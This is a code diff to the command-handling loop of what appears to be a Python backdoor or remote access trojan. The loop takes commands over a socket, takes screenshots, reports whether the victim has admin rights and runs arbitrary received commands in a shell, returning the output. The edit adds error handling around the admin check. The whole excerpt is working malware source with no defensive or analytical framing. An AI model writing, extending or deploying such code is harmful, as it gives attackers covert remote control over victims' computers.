@@ -105,10 +105,13 @@ def shell(_s):
             except:
                 reliable_send(_s, '[!] Failed to take the screenshot!!')
         elif cmd[:7] == 'isadmin':
-            if is_admin():
-                reliable_send(_s, '[+] The user HAS Admin priviledges!')
-            else:
-                reliable_send(_s, '[!] The user does NOT has Admin priviledges!')
+            try:
+                if is_admin():
+                    reliable_send(_s, '[+] The user HAS Admin priviledges!')
+                else:
+                    reliable_send(_s, '[!] The user does NOT has Admin priviledges!')
+            except:
+                reliable_send(_s, 'Can`t perform the check')
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
